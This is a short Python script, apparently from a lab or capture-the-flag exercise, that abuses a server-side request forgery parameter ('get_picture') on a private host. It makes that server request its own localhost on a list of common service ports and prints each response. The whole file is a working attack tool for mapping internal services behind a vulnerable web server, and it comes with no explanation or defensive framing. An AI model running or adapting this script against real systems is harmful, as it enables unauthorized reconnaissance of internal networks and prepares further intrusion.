import requests

ports = [21,22,25,80,139,445,443,3306,5432,8000,8080,9000]
url = "http://10.10.0.32/?get_picture=http://localhost:"
def portscan():
  for p in ports:
    print("testing port: " + str(p))
    r = requests.get(url + str(p))
    print(len(r.text))
    print(r.status_code)
    print(r.text)

portscan()